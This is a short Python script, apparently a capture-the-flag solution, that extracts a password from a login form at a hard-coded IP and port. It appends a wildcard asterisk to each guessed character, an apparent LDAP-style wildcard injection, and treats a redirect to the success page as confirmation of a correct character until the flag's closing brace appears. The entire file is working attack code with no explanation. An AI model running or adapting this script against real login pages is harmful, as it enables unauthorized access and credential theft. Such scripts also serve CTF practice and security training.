import requests
import time

url = "http://139.59.175.51:30784/"
website = url + "login"
username = "reese"
wildcard = "*"
passwd = ""

#Failed login URL
#http://139.59.175.51:30784/login?message=Authentication%20failed
#Successful login URL
#http://139.59.175.51:30784/

s = requests.session()

while True:
    try:
        for i in range(33,127): #Iterates all ascii characters
            if i == 42: #Excludes asterisk from iteration
                continue
            character = chr(i)
            time.sleep(0.05)
            t = s.post(website, data={"username": username, "password": passwd + character + wildcard})
            if url == t.url:
                print (passwd + character + wildcard)
                passwd = passwd + chr(i)
                if chr(i) == "}":
                    print ("Flag found!! " + passwd)
                    exit()
                break
    except:
        print ("End")
        exit()